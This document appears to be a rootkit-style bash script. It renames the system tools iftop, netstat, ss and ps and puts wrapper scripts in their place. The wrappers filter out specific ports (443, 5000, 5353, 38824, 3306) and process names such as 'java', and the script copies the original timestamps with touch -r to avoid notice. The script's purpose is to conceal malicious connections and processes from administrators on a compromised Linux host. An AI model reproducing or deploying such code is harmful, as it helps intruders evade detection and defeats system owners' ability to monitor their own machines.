#!/bin/bash
if [  -f "/sbin/iftop2" ];then
        rm -rf /sbin/iftop
        mv /sbin/iftop2 /sbin/iftop
fi
if [  -f "/sbin/ntss" ];then
        rm -rf /sbin/ss
        mv /sbin/ntss /sbin/ss
fi
if [  -f "/bin/ntstat" ];then
        rm -rf /bin/netstat
        mv /bin/ntstat /bin/netstat
fi
if [  -f "/bin/efps" ];then
        rm -rf /bin/ps
        mv /bin/efps /bin/ps
fi
cd /sbin/
mv iftop iftop2
echo '#!/bin/bash
iftop2 -f "port not 443 and port not 5353 and port not 5000 and port not 38824 and port not 3306"' > iftop
chmod +x iftop
touch -r iftop2 iftop
#netstat
mv /bin/netstat /bin/ntstat
cd /bin/
echo '#!/bin/bash
/bin/ntstat $1 $2 $3 $4 $5 $6 | grep -Ev "443|5000|5353|38824|dhclient|kworker|TIME_WAIT|java"' > netstat
chmod 755 netstat
touch -r /bin/ntstat /bin/netstat
#ss
mv /sbin/ss /sbin/ntss
cd /sbin/
echo '#!/bin/bash
/sbin/ntss $1 $2 $3 $4 $5 $6 | grep -Ev "443|5000|5353|38824|dhclient|kworker|TIME_WAIT|nts|java"' > /sbin/ss
chmod +x /sbin/ss
touch -r /sbin/ntss /sbin/ss
#ps
mv /bin/ps /bin/efps
cd /bin/
echo '#!/bin/bash
/bin/efps $1 $2 $3 $4 $5 $6 | grep -Ev "efps|ps|/bin/java"' > /bin/ps
chmod +x /bin/ps
touch -r /bin/efps /bin/ps
